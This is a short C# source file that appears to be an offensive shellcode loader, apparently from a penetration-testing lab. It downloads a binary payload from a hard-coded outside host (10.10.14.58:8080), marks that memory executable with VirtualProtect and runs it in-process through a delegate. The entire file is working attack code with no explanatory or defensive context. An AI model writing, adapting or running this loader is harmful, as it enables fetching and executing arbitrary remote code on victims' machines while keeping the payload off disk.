using System;
using System.Net;
using System.Runtime.InteropServices;

namespace Reflection
{
    public class Program
    {
        public delegate void grunt();
        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwsize, uint flNewProtect, out uint lpflOldProtect);

        public static void Main()
        {
            var wc = new WebClient();
            var sc = wc.DownloadData("http://10.10.14.58:8080/rasta9001.bin");
            GCHandle pinned = GCHandle.Alloc(sc, GCHandleType.Pinned);
            IntPtr ptr = pinned.AddrOfPinnedObject();
            Marshal.Copy(sc, 0, ptr, sc.Length);
            uint lpflOldProtect;
            VirtualProtect(ptr, (UIntPtr)sc.Length, 0x40, out lpflOldProtect);
            grunt exec = Marshal.GetDelegateForFunctionPointer<grunt>(ptr);
            exec();
        }
    }
}